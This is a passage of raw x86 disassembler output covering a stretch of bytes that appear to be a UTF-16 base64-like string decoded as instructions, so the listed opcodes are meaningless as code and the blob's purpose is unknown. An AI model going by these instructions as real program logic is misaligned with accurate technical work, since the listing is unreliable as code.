  40a94b:	00 51 00             	add    %dl,0x0(%ecx)
  40a94e:	62 00                	bound  %eax,(%eax)
  40a950:	54                   	push   %esp
  40a951:	00 62 00             	add    %ah,0x0(%edx)
  40a954:	57                   	push   %edi
  40a955:	00 68 00             	add    %ch,0x0(%eax)
  40a958:	59                   	pop    %ecx
  40a959:	00 2b                	add    %ch,(%ebx)
  40a95b:	00 70 00             	add    %dh,0x0(%eax)
  40a95e:	38 00                	cmp    %al,(%eax)
  40a960:	6a 00                	push   $0x0
  40a962:	4c                   	dec    %esp
  40a963:	00 55 00             	add    %dl,0x0(%ebp)
  40a966:	54                   	push   %esp
  40a967:	00 70 00             	add    %dh,0x0(%eax)
  40a96a:	47                   	inc    %edi
  40a96b:	00 2b                	add    %ch,(%ebx)
  40a96d:	00 75 00             	add    %dh,0x0(%ebp)
  40a970:	6e                   	outsb  %ds:(%esi),(%dx)
  40a971:	00 5a 00             	add    %bl,0x0(%edx)
  40a974:	77 00                	ja     0x40a976
  40a976:	59                   	pop    %ecx
  40a977:	00 51 00             	add    %dl,0x0(%ecx)
  40a97a:	32 00                	xor    (%eax),%al
  40a97c:	41                   	inc    %ecx
  40a97d:	00 46 00             	add    %al,0x0(%esi)
  40a980:	6b 00 33             	imul   $0x33,(%eax),%eax
  40a983:	00 62 00             	add    %ah,0x0(%edx)
  40a986:	53                   	push   %ebx
  40a987:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  40a98b:	00 43 00             	add    %al,0x0(%ebx)
  40a98e:	67 00 77 00          	add    %dh,0x0(%bx)
  40a992:	65 00 4f 00          	add    %cl,%gs:0x0(%edi)
  40a996:	53                   	push   %ebx
  40a997:	00 35 00 6e 00 76    	add    %dh,0x76006e00
  40a99d:	00 50 00             	add    %dl,0x0(%eax)
  40a9a0:	59                   	pop    %ecx
  40a9a1:	00 61 00             	add    %ah,0x0(%ecx)
  40a9a4:	31 00                	xor    %eax,(%eax)
  40a9a6:	6a 00                	push   $0x0
  40a9a8:	49                   	dec    %ecx
  40a9a9:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  40a9ad:	00 2f                	add    %ch,(%edi)
  40a9af:	00 37                	add    %dh,(%edi)
  40a9b1:	00 4b 00             	add    %cl,0x0(%ebx)
  40a9b4:	53                   	push   %ebx
  40a9b5:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  40a9b9:	00 72 00             	add    %dh,0x0(%edx)
  40a9bc:	77 00                	ja     0x40a9be
  40a9be:	67 00 71 00          	add    %dh,0x0(%bx,%di)
  40a9c2:	73 00                	jae    0x40a9c4
  40a9c4:	38 00                	cmp    %al,(%eax)
  40a9c6:	55                   	push   %ebp
  40a9c7:	00 33                	add    %dh,(%ebx)
  40a9c9:	00 61 00             	add    %ah,0x0(%ecx)
  40a9cc:	4b                   	dec    %ebx
  40a9cd:	00 30                	add    %dh,(%eax)
  40a9cf:	00 35 00 73 00 59    	add    %dh,0x59007300
  40a9d5:	00 30                	add    %dh,(%eax)
  40a9d7:	00 2b                	add    %ch,(%ebx)
  40a9d9:	00 58 00             	add    %bl,0x0(%eax)
  40a9dc:	47                   	inc    %edi
  40a9dd:	00 45 00             	add    %al,0x0(%ebp)
  40a9e0:	39 00                	cmp    %eax,(%eax)
  40a9e2:	39 00                	cmp    %eax,(%eax)
  40a9e4:	59                   	pop    %ecx
  40a9e5:	00 61 00             	add    %ah,0x0(%ecx)
  40a9e8:	66 00 44 00 38       	data16 add %al,0x38(%eax,%eax,1)
  40a9ed:	00 4b 00             	add    %cl,0x0(%ebx)
  40a9f0:	4d                   	dec    %ebp
  40a9f1:	00 59 00             	add    %bl,0x0(%ecx)
  40a9f4:	6a 00                	push   $0x0
  40a9f6:	6b 00 33             	imul   $0x33,(%eax),%eax
  40a9f9:	00 67 00             	add    %ah,0x0(%edi)
  40a9fc:	53                   	push   %ebx
  40a9fd:	00 76 00             	add    %dh,0x0(%esi)
  40aa00:	58                   	pop    %eax
  40aa01:	00 39                	add    %bh,(%ecx)
  40aa03:	00 4b 00             	add    %cl,0x0(%ebx)
  40aa06:	7a 00                	jp     0x40aa08
  40aa08:	7a 00                	jp     0x40aa0a
  40aa0a:	52                   	push   %edx
  40aa0b:	00 74 00 4f          	add    %dh,0x4f(%eax,%eax,1)
  40aa0f:	00 48 00             	add    %cl,0x0(%eax)
  40aa12:	71 00                	jno    0x40aa14
  40aa14:	46                   	inc    %esi
  40aa15:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa18:	49                   	dec    %ecx
  40aa19:	00 6f 00             	add    %ch,0x0(%edi)
  40aa1c:	71 00                	jno    0x40aa1e
  40aa1e:	76 00                	jbe    0x40aa20
  40aa20:	71 00                	jno    0x40aa22
  40aa22:	66 00 33             	data16 add %dh,(%ebx)
  40aa25:	00 37                	add    %dh,(%edi)
  40aa27:	00 37                	add    %dh,(%edi)
  40aa29:	00 5a 00             	add    %bl,0x0(%edx)
  40aa2c:	66 00 43 00          	data16 add %al,0x0(%ebx)
  40aa30:	4d                   	dec    %ebp
  40aa31:	00 75 00             	add    %dh,0x0(%ebp)
  40aa34:	61                   	popa
  40aa35:	00 32                	add    %dh,(%edx)
  40aa37:	00 33                	add    %dh,(%ebx)
  40aa39:	00 61 00             	add    %ah,0x0(%ecx)
  40aa3c:	34 00                	xor    $0x0,%al
  40aa3e:	39 00                	cmp    %eax,(%eax)
  40aa40:	30 00                	xor    %al,(%eax)
  40aa42:	52                   	push   %edx
  40aa43:	00 33                	add    %dh,(%ebx)
  40aa45:	00 4d 00             	add    %cl,0x0(%ebp)
  40aa48:	6d                   	insl   (%dx),%es:(%edi)
  40aa49:	00 33                	add    %dh,(%ebx)
  40aa4b:	00 31                	add    %dh,(%ecx)
  40aa4d:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa50:	62 00                	bound  %eax,(%eax)
  40aa52:	32 00                	xor    (%eax),%al
  40aa54:	59                   	pop    %ecx
  40aa55:	00 56 00             	add    %dl,0x0(%esi)
  40aa58:	39 00                	cmp    %eax,(%eax)
  40aa5a:	4b                   	dec    %ebx
  40aa5b:	00 4e 00             	add    %cl,0x0(%esi)
  40aa5e:	76 00                	jbe    0x40aa60
  40aa60:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40aa64:	55                   	push   %ebp
  40aa65:	00 70 00             	add    %dh,0x0(%eax)
  40aa68:	51                   	push   %ecx
  40aa69:	00 56 00             	add    %dl,0x0(%esi)
  40aa6c:	67 00 78 00          	add    %bh,0x0(%bx,%si)
  40aa70:	59                   	pop    %ecx
  40aa71:	00 35 00 4f 00 58    	add    %dh,0x58004f00
  40aa77:	00 67 00             	add    %ah,0x0(%edi)
  40aa7a:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa7b:	00 46 00             	add    %al,0x0(%esi)
  40aa7e:	73 00                	jae    0x40aa80
  40aa80:	63 00                	arpl   %eax,(%eax)
  40aa82:	50                   	push   %eax
  40aa83:	00 64 00 4f          	add    %ah,0x4f(%eax,%eax,1)
  40aa87:	00 63 00             	add    %ah,0x0(%ebx)
  40aa8a:	66 00 62 00          	data16 add %ah,0x0(%edx)
  40aa8e:	67 00 30             	add    %dh,(%bx,%si)
  40aa91:	00 30                	add    %dh,(%eax)
  40aa93:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aa96:	59                   	pop    %ecx
  40aa97:	00 49 00             	add    %cl,0x0(%ecx)
  40aa9a:	6b 00 68             	imul   $0x68,(%eax),%eax
  40aa9d:	00 2b                	add    %ch,(%ebx)
  40aa9f:	00 6a 00             	add    %ch,0x0(%edx)
  40aaa2:	7a 00                	jp     0x40aaa4
  40aaa4:	42                   	inc    %edx
  40aaa5:	00 72 00             	add    %dh,0x0(%edx)
  40aaa8:	44                   	inc    %esp
  40aaa9:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  40aaad:	00 37                	add    %dh,(%edi)
  40aaaf:	00 32                	add    %dh,(%edx)
  40aab1:	00 78 00             	add    %bh,0x0(%eax)
  40aab4:	44                   	inc    %esp
  40aab5:	00 4a 00             	add    %cl,0x0(%edx)
  40aab8:	44                   	inc    %esp
  40aab9:	00 5a 00             	add    %bl,0x0(%edx)
  40aabc:	6d                   	insl   (%dx),%es:(%edi)
  40aabd:	00 32                	add    %dh,(%edx)
  40aabf:	00 51 00             	add    %dl,0x0(%ecx)
  40aac2:	30 00                	xor    %al,(%eax)
  40aac4:	48                   	dec    %eax
  40aac5:	00 53 00             	add    %dl,0x0(%ebx)
  40aac8:	49                   	dec    %ecx
  40aac9:	00 7a 00             	add    %bh,0x0(%edx)
  40aacc:	34 00                	xor    $0x0,%al
  40aace:	39 00                	cmp    %eax,(%eax)
  40aad0:	4e                   	dec    %esi
  40aad1:	00 6e 00             	add    %ch,0x0(%esi)
  40aad4:	2f                   	das
  40aad5:	00 5a 00             	add    %bl,0x0(%edx)
  40aad8:	50                   	push   %eax
  40aad9:	00 52 00             	add    %dl,0x0(%edx)
  40aadc:	6e                   	outsb  %ds:(%esi),(%dx)
  40aadd:	00 42 00             	add    %al,0x0(%edx)
  40aae0:	4c                   	dec    %esp
  40aae1:	00 4b 00             	add    %cl,0x0(%ebx)
  40aae4:	4a                   	dec    %edx
  40aae5:	00 7a 00             	add    %bh,0x0(%edx)
  40aae8:	47                   	inc    %edi
  40aae9:	00 32                	add    %dh,(%edx)
  40aaeb:	00 39                	add    %bh,(%ecx)
  40aaed:	00 48 00             	add    %cl,0x0(%eax)
  40aaf0:	47                   	inc    %edi
  40aaf1:	00 71 00             	add    %dh,0x0(%ecx)
  40aaf4:	57                   	push   %edi
  40aaf5:	00 47 00             	add    %al,0x0(%edi)
  40aaf8:	76 00                	jbe    0x40aafa
  40aafa:	35 00 79 00 6b       	xor    $0x6b007900,%eax
  40aaff:	00 76 00             	add    %dh,0x0(%esi)
  40ab02:	4a                   	dec    %edx
  40ab03:	00 4d 00             	add    %cl,0x0(%ebp)
  40ab06:	45                   	inc    %ebp
  40ab07:	00 38                	add    %bh,(%eax)
  40ab09:	00 48 00             	add    %cl,0x0(%eax)
  40ab0c:	4b                   	dec    %ebx
  40ab0d:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
  40ab11:	00 38                	add    %bh,(%eax)
  40ab13:	00 39                	add    %bh,(%ecx)
  40ab15:	00 41 00             	add    %al,0x0(%ecx)
  40ab18:	58                   	pop    %eax
  40ab19:	00 41 00             	add    %al,0x0(%ecx)
  40ab1c:	67 00 46 00          	add    %al,0x0(%bp)
  40ab20:	56                   	push   %esi
  40ab21:	00 63 00             	add    %ah,0x0(%ebx)
  40ab24:	77 00                	ja     0x40ab26
  40ab26:	4a                   	dec    %edx
  40ab27:	00 59 00             	add    %bl,0x0(%ecx)
  40ab2a:	62 00                	bound  %eax,(%eax)
  40ab2c:	47                   	inc    %edi
  40ab2d:	00 37                	add    %dh,(%edi)
  40ab2f:	00 33                	add    %dh,(%ebx)
  40ab31:	00 32                	add    %dh,(%edx)
  40ab33:	00 57 00             	add    %dl,0x0(%edi)
  40ab36:	52                   	push   %edx
  40ab37:	00 35 00 6d 00 7a    	add    %dh,0x7a006d00
  40ab3d:	00 55 00             	add    %dl,0x0(%ebp)
  40ab40:	4b                   	dec    %ebx
  40ab41:	00 51 00             	add    %dl,0x0(%ecx)
  40ab44:	78 00                	js     0x40ab46
  40ab46:	43                   	inc    %ebx
  40ab47:	00 50 00             	add    %dl,0x0(%eax)
  40ab4a:	70 00                	jo     0x40ab4c
  40ab4c:	4a                   	dec    %edx
  40ab4d:	00 76 00             	add    %dh,0x0(%esi)
  40ab50:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  40ab53:	00 61 00             	add    %ah,0x0(%ecx)
  40ab56:	42                   	inc    %edx
  40ab57:	00 6e 00             	add    %ch,0x0(%esi)
  40ab5a:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  40ab5d:	00 4d 00             	add    %cl,0x0(%ebp)
  40ab60:	62 00                	bound  %eax,(%eax)
  40ab62:	56                   	push   %esi
  40ab63:	00 7a 00             	add    %bh,0x0(%edx)
  40ab66:	50                   	push   %eax
  40ab67:	00 49 00             	add    %cl,0x0(%ecx)
  40ab6a:	48                   	dec    %eax
  40ab6b:	00 67 00             	add    %ah,0x0(%edi)
  40ab6e:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  40ab72:	71 00                	jno    0x40ab74
  40ab74:	66 00 39             	data16 add %bh,(%ecx)
  40ab77:	00 70 00             	add    %dh,0x0(%eax)
  40ab7a:	6b 00 37             	imul   $0x37,(%eax),%eax
  40ab7d:	00 5a 00             	add    %bl,0x0(%edx)
  40ab80:	4f                   	dec    %edi
  40ab81:	00 43 00             	add    %al,0x0(%ebx)
  40ab84:	77 00                	ja     0x40ab86
  40ab86:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab87:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ab8a:	77 00                	ja     0x40ab8c
  40ab8c:	63 00                	arpl   %eax,(%eax)
  40ab8e:	7a 00                	jp     0x40ab90
  40ab90:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
  40ab94:	56                   	push   %esi
  40ab95:	00 57 00             	add    %dl,0x0(%edi)
  40ab98:	31 00                	xor    %eax,(%eax)
  40ab9a:	36 00 44 00 58       	add    %al,%ss:0x58(%eax,%eax,1)
  40ab9f:	00 51 00             	add    %dl,0x0(%ecx)
  40aba2:	58                   	pop    %eax
  40aba3:	00 73 00             	add    %dh,0x0(%ebx)
  40aba6:	6b 00 44             	imul   $0x44,(%eax),%eax
  40aba9:	00 4d 00             	add    %cl,0x0(%ebp)
  40abac:	30 00                	xor    %al,(%eax)
  40abae:	59                   	pop    %ecx
  40abaf:	00 69 00             	add    %ch,0x0(%ecx)
  40abb2:	6f                   	outsl  %ds:(%esi),(%dx)
  40abb3:	00 79 00             	add    %bh,0x0(%ecx)
  40abb6:	6f                   	outsl  %ds:(%esi),(%dx)
  40abb7:	00 77 00             	add    %dh,0x0(%edi)
  40abba:	4b                   	dec    %ebx
  40abbb:	00 70 00             	add    %dh,0x0(%eax)
  40abbe:	6f                   	outsl  %ds:(%esi),(%dx)
  40abbf:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
  40abc3:	00 62 00             	add    %ah,0x0(%edx)
  40abc6:	33 00                	xor    (%eax),%eax
  40abc8:	37                   	aaa
  40abc9:	00 50 00             	add    %dl,0x0(%eax)
  40abcc:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  40abd0:	4c                   	dec    %esp
  40abd1:	00 59 00             	add    %bl,0x0(%ecx)
  40abd4:	69 00 7a 00 46 00    	imul   $0x46007a,(%eax),%eax
  40abda:	51                   	push   %ecx
  40abdb:	00 53 00             	add    %dl,0x0(%ebx)
  40abde:	42                   	inc    %edx
  40abdf:	00 72 00             	add    %dh,0x0(%edx)
  40abe2:	2b 00                	sub    (%eax),%eax
  40abe4:	61                   	popa
  40abe5:	00 6f 00             	add    %ch,0x0(%edi)
  40abe8:	38 00                	cmp    %al,(%eax)
  40abea:	55                   	push   %ebp
  40abeb:	00 53 00             	add    %dl,0x0(%ebx)
  40abee:	59                   	pop    %ecx
  40abef:	00 79 00             	add    %bh,0x0(%ecx)
  40abf2:	2b 00                	sub    (%eax),%eax
  40abf4:	73 00                	jae    0x40abf6
  40abf6:	6f                   	outsl  %ds:(%esi),(%dx)
  40abf7:	00 5a 00             	add    %bl,0x0(%edx)
  40abfa:	49                   	dec    %ecx
  40abfb:	00 73 00             	add    %dh,0x0(%ebx)
  40abfe:	76 00                	jbe    0x40ac00
  40ac00:	55                   	push   %ebp
  40ac01:	00 39                	add    %bh,(%ecx)
  40ac03:	00 2b                	add    %ch,(%ebx)
  40ac05:	00 58 00             	add    %bl,0x0(%eax)
  40ac08:	50                   	push   %eax
  40ac09:	00 72 00             	add    %dh,0x0(%edx)
  40ac0c:	31 00                	xor    %eax,(%eax)
  40ac0e:	78 00                	js     0x40ac10
  40ac10:	43                   	inc    %ebx
  40ac11:	00 47 00             	add    %al,0x0(%edi)
  40ac14:	57                   	push   %edi
  40ac15:	00 4d 00             	add    %cl,0x0(%ebp)
  40ac18:	48                   	dec    %eax
  40ac19:	00 4f 00             	add    %cl,0x0(%edi)
  40ac1c:	4b                   	dec    %ebx
  40ac1d:	00 56 00             	add    %dl,0x0(%esi)
  40ac20:	76 00                	jbe    0x40ac22
  40ac22:	72 00                	jb     0x40ac24
  40ac24:	64 00 78 00          	add    %bh,%fs:0x0(%eax)
  40ac28:	4e                   	dec    %esi
  40ac29:	00 45 00             	add    %al,0x0(%ebp)
  40ac2c:	65 00 6f 00          	add    %ch,%gs:0x0(%edi)
  40ac30:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac31:	00 30                	add    %dh,(%eax)
  40ac33:	00 6e 00             	add    %ch,0x0(%esi)
  40ac36:	49                   	dec    %ecx
  40ac37:	00 48 00             	add    %cl,0x0(%eax)
  40ac3a:	73 00                	jae    0x40ac3c
  40ac3c:	47                   	inc    %edi
  40ac3d:	00 77 00             	add    %dh,0x0(%edi)
  40ac40:	63 00                	arpl   %eax,(%eax)
  40ac42:	62 00                	bound  %eax,(%eax)
  40ac44:	4a                   	dec    %edx
  40ac45:	00 58 00             	add    %bl,0x0(%eax)
  40ac48:	4e                   	dec    %esi
  40ac49:	00 76 00             	add    %dh,0x0(%esi)
  40ac4c:	38 00                	cmp    %al,(%eax)
  40ac4e:	56                   	push   %esi
  40ac4f:	00 2f                	add    %ch,(%edi)
  40ac51:	00 7a 00             	add    %bh,0x0(%edx)
  40ac54:	54                   	push   %esp
  40ac55:	00 4d 00             	add    %cl,0x0(%ebp)
  40ac58:	76 00                	jbe    0x40ac5a
  40ac5a:	4e                   	dec    %esi
  40ac5b:	00 4c 00 37          	add    %cl,0x37(%eax,%eax,1)
  40ac5f:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
  40ac63:	00 30                	add    %dh,(%eax)
  40ac65:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  40ac69:	00 55 00             	add    %dl,0x0(%ebp)
  40ac6c:	33 00                	xor    (%eax),%eax
  40ac6e:	35 00 4b 00 42       	xor    $0x42004b00,%eax
  40ac73:	00 63 00             	add    %ah,0x0(%ebx)
  40ac76:	7a 00                	jp     0x40ac78
  40ac78:	4e                   	dec    %esi
  40ac79:	00 51 00             	add    %dl,0x0(%ecx)
  40ac7c:	50                   	push   %eax
  40ac7d:	00 49 00             	add    %cl,0x0(%ecx)
  40ac80:	6c                   	insb   (%dx),%es:(%edi)
  40ac81:	00 59 00             	add    %bl,0x0(%ecx)
  40ac84:	43                   	inc    %ebx
  40ac85:	00 68 00             	add    %ch,0x0(%eax)
  40ac88:	69 00 55 00 42 00    	imul   $0x420055,(%eax),%eax
  40ac8e:	56                   	push   %esi
  40ac8f:	00 2b                	add    %ch,(%ebx)
  40ac91:	00 6e 00             	add    %ch,0x0(%esi)
  40ac94:	37                   	aaa
  40ac95:	00 50 00             	add    %dl,0x0(%eax)
  40ac98:	76 00                	jbe    0x40ac9a
  40ac9a:	44                   	inc    %esp
  40ac9b:	00 52 00             	add    %dl,0x0(%edx)
  40ac9e:	4f                   	dec    %edi
  40ac9f:	00 42 00             	add    %al,0x0(%edx)
  40aca2:	34 00                	xor    $0x0,%al
  40aca4:	46                   	inc    %esi
  40aca5:	00 67 00             	add    %ah,0x0(%edi)
  40aca8:	2b 00                	sub    (%eax),%eax
  40acaa:	59                   	pop    %ecx
  40acab:	00 49 00             	add    %cl,0x0(%ecx)
  40acae:	62 00                	bound  %eax,(%eax)
  40acb0:	32 00                	xor    (%eax),%al
  40acb2:	77 00                	ja     0x40acb4
  40acb4:	6c                   	insb   (%dx),%es:(%edi)
  40acb5:	00 30                	add    %dh,(%eax)
  40acb7:	00 62 00             	add    %ah,0x0(%edx)
  40acba:	65 00 6f 00          	add    %ch,%gs:0x0(%edi)
  40acbe:	57                   	push   %edi
  40acbf:	00 53 00             	add    %dl,0x0(%ebx)
  40acc2:	30 00                	xor    %al,(%eax)
  40acc4:	4b                   	dec    %ebx
  40acc5:	00 6e 00             	add    %ch,0x0(%esi)
  40acc8:	4e                   	dec    %esi
  40acc9:	00 4e 00             	add    %cl,0x0(%esi)
  40accc:	36 00 6e 00          	add    %ch,%ss:0x0(%esi)
  40acd0:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  40acd4:	66 00 64 00 51       	data16 add %ah,0x51(%eax,%eax,1)
  40acd9:	00 69 00             	add    %ch,0x0(%ecx)
  40acdc:	4d                   	dec    %ebp
  40acdd:	00 30                	add    %dh,(%eax)
  40acdf:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ace2:	55                   	push   %ebp
  40ace3:	00 57 00             	add    %dl,0x0(%edi)
  40ace6:	69 00 43 00 4f 00    	imul   $0x4f0043,(%eax),%eax
  40acec:	62 00                	bound  %eax,(%eax)
  40acee:	4a                   	dec    %edx
  40acef:	00 72 00             	add    %dh,0x0(%edx)
  40acf2:	4f                   	dec    %edi
  40acf3:	00 35 00 65 00 76    	add    %dh,0x76006500
  40acf9:	00 68 00             	add    %ch,0x0(%eax)
  40acfc:	55                   	push   %ebp
  40acfd:	00 64 00 38          	add    %ah,0x38(%eax,%eax,1)
  40ad01:	00 4e 00             	add    %cl,0x0(%esi)
  40ad04:	31 00                	xor    %eax,(%eax)
  40ad06:	78 00                	js     0x40ad08
  40ad08:	62 00                	bound  %eax,(%eax)
  40ad0a:	6b 00 43             	imul   $0x43,(%eax),%eax
  40ad0d:	00 5a 00             	add    %bl,0x0(%edx)
  40ad10:	79 00                	jns    0x40ad12
  40ad12:	62 00                	bound  %eax,(%eax)
  40ad14:	77 00                	ja     0x40ad16
  40ad16:	43                   	inc    %ebx
  40ad17:	00 67 00             	add    %ah,0x0(%edi)
  40ad1a:	2b 00                	sub    (%eax),%eax
  40ad1c:	72 00                	jb     0x40ad1e
  40ad1e:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  40ad22:	35 00 2b 00 76       	xor    $0x76002b00,%eax
  40ad27:	00 48 00             	add    %cl,0x0(%eax)
  40ad2a:	65 00 4c 00 71       	add    %cl,%gs:0x71(%eax,%eax,1)
  40ad2f:	00 52 00             	add    %dl,0x0(%edx)
  40ad32:	33 00                	xor    (%eax),%eax
  40ad34:	6a 00                	push   $0x0
  40ad36:	31 00                	xor    %eax,(%eax)
  40ad38:	78 00                	js     0x40ad3a
  40ad3a:	69 00 46 00 69 00    	imul   $0x690046,(%eax),%eax
  40ad40:	6a 00                	push   $0x0
  40ad42:	52                   	push   %edx
  40ad43:	00 47 00             	add    %al,0x0(%edi)
  40ad46:	32 00                	xor    (%eax),%al
  40ad48:	58                   	pop    %eax
  40ad49:	00 6f 00             	add    %ch,0x0(%edi)
  40ad4c:	45                   	inc    %ebp
  40ad4d:	00 6b 00             	add    %ch,0x0(%ebx)
  40ad50:	4a                   	dec    %edx
  40ad51:	00 30                	add    %dh,(%eax)
  40ad53:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40ad57:	00 37                	add    %dh,(%edi)
  40ad59:	00 67 00             	add    %ah,0x0(%edi)
  40ad5c:	7a 00                	jp     0x40ad5e
  40ad5e:	71 00                	jno    0x40ad60
  40ad60:	4c                   	dec    %esp
  40ad61:	00 76 00             	add    %dh,0x0(%esi)
  40ad64:	33 00                	xor    (%eax),%eax
  40ad66:	4e                   	dec    %esi
  40ad67:	00 42 00             	add    %al,0x0(%edx)
  40ad6a:	4b                   	dec    %ebx
  40ad6b:	00 42 00             	add    %al,0x0(%edx)
  40ad6e:	69 00 78 00 69 00    	imul   $0x690078,(%eax),%eax
  40ad74:	4f                   	dec    %edi
  40ad75:	00 52 00             	add    %dl,0x0(%edx)
  40ad78:	58                   	pop    %eax
  40ad79:	00 47 00             	add    %al,0x0(%edi)
  40ad7c:	62 00                	bound  %eax,(%eax)
  40ad7e:	4a                   	dec    %edx
  40ad7f:	00 77 00             	add    %dh,0x0(%edi)
  40ad82:	2b 00                	sub    (%eax),%eax
  40ad84:	66 00 4d 00          	data16 add %cl,0x0(%ebp)
  40ad88:	68 00 37 00 44       	push   $0x44003700
  40ad8d:	00 30                	add    %dh,(%eax)
  40ad8f:	00 35 00 45 00 42    	add    %dh,0x42004500
  40ad95:	00 49 00             	add    %cl,0x0(%ecx)
  40ad98:	7a 00                	jp     0x40ad9a
  40ad9a:	78 00                	js     0x40ad9c
  40ad9c:	67 00 6a 00          	add    %ch,0x0(%bp,%si)
  40ada0:	76 00                	jbe    0x40ada2
  40ada2:	77 00                	ja     0x40ada4
  40ada4:	34 00                	xor    $0x0,%al
  40ada6:	2f                   	das
  40ada7:	00 76 00             	add    %dh,0x0(%esi)
  40adaa:	76 00                	jbe    0x40adac
  40adac:	75 00                	jne    0x40adae
  40adae:	41                   	inc    %ecx
  40adaf:	00 41 00             	add    %al,0x0(%ecx)
  40adb2:	78 00                	js     0x40adb4
  40adb4:	33 00                	xor    (%eax),%eax
  40adb6:	57                   	push   %edi
  40adb7:	00 7a 00             	add    %bh,0x0(%edx)
  40adba:	48                   	dec    %eax
  40adbb:	00 38                	add    %bh,(%eax)
  40adbd:	00 63 00             	add    %ah,0x0(%ebx)
  40adc0:	2f                   	das
  40adc1:	00 2b                	add    %ch,(%ebx)
  40adc3:	00 64 00 67          	add    %ah,0x67(%eax,%eax,1)
  40adc7:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40adcb:	00 5a 00             	add    %bl,0x0(%edx)
  40adce:	77 00                	ja     0x40add0
  40add0:	6a 00                	push   $0x0
  40add2:	33 00                	xor    (%eax),%eax
  40add4:	70 00                	jo     0x40add6
  40add6:	4f                   	dec    %edi
  40add7:	00 6a 00             	add    %ch,0x0(%edx)
  40adda:	61                   	popa
  40addb:	00 52 00             	add    %dl,0x0(%edx)
  40adde:	42                   	inc    %edx
  40addf:	00 70 00             	add    %dh,0x0(%eax)
  40ade2:	55                   	push   %ebp
  40ade3:	00 78 00             	add    %bh,0x0(%eax)
  40ade6:	2f                   	das
  40ade7:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  40adeb:	00 50 00             	add    %dl,0x0(%eax)
  40adee:	63 00                	arpl   %eax,(%eax)
  40adf0:	34 00                	xor    $0x0,%al
  40adf2:	76 00                	jbe    0x40adf4
  40adf4:	30 00                	xor    %al,(%eax)
  40adf6:	4a                   	dec    %edx
  40adf7:	00 5a 00             	add    %bl,0x0(%edx)
  40adfa:	52                   	push   %edx
  40adfb:	00 6e 00             	add    %ch,0x0(%esi)
  40adfe:	34 00                	xor    $0x0,%al
  40ae00:	59                   	pop    %ecx
  40ae01:	00 6a 00             	add    %ch,0x0(%edx)
  40ae04:	49                   	dec    %ecx
  40ae05:	00 63 00             	add    %ah,0x0(%ebx)
  40ae08:	45                   	inc    %ebp
  40ae09:	00 4b 00             	add    %cl,0x0(%ebx)
  40ae0c:	30 00                	xor    %al,(%eax)
  40ae0e:	48                   	dec    %eax
  40ae0f:	00 42 00             	add    %al,0x0(%edx)
  40ae12:	2b 00                	sub    (%eax),%eax
  40ae14:	2b 00                	sub    (%eax),%eax
  40ae16:	51                   	push   %ecx
  40ae17:	00 78 00             	add    %bh,0x0(%eax)
  40ae1a:	38 00                	cmp    %al,(%eax)
  40ae1c:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  40ae20:	59                   	pop    %ecx
  40ae21:	00 55 00             	add    %dl,0x0(%ebp)
  40ae24:	41                   	inc    %ecx
  40ae25:	00 32                	add    %dh,(%edx)
  40ae27:	00 65 00             	add    %ah,0x0(%ebp)
  40ae2a:	46                   	inc    %esi
  40ae2b:	00 42 00             	add    %al,0x0(%edx)
  40ae2e:	6c                   	insb   (%dx),%es:(%edi)
  40ae2f:	00 36                	add    %dh,(%esi)
  40ae31:	00 6a 00             	add    %ch,0x0(%edx)
  40ae34:	32 00                	xor    (%eax),%al
  40ae36:	73 00                	jae    0x40ae38
  40ae38:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae39:	00 6e 00             	add    %ch,0x0(%esi)
  40ae3c:	61                   	popa
  40ae3d:	00 5a 00             	add    %bl,0x0(%edx)
  40ae40:	4f                   	dec    %edi
  40ae41:	00 2b                	add    %ch,(%ebx)
  40ae43:	00 67 00             	add    %ah,0x0(%edi)
  40ae46:	5a                   	pop    %edx
  40ae47:	00 50 00             	add    %dl,0x0(%eax)
  40ae4a:	49                   	dec    %ecx
  40ae4b:	00 70 00             	add    %dh,0x0(%eax)
  40ae4e:	32 00                	xor    (%eax),%al
  40ae50:	48                   	dec    %eax
  40ae51:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
  40ae55:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae58:	61                   	popa
  40ae59:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae5c:	5a                   	pop    %edx
  40ae5d:	00 33                	add    %dh,(%ebx)
  40ae5f:	00 39                	add    %bh,(%ecx)
  40ae61:	00 46 00             	add    %al,0x0(%esi)
  40ae64:	49                   	dec    %ecx
  40ae65:	00 70 00             	add    %dh,0x0(%eax)
  40ae68:	39 00                	cmp    %eax,(%eax)
  40ae6a:	2b 00                	sub    (%eax),%eax
  40ae6c:	55                   	push   %ebp
  40ae6d:	00 56 00             	add    %dl,0x0(%esi)
  40ae70:	4f                   	dec    %edi
  40ae71:	00 53 00             	add    %dl,0x0(%ebx)
  40ae74:	76 00                	jbe    0x40ae76
  40ae76:	48                   	dec    %eax
  40ae77:	00 7a 00             	add    %bh,0x0(%edx)
  40ae7a:	46                   	inc    %esi
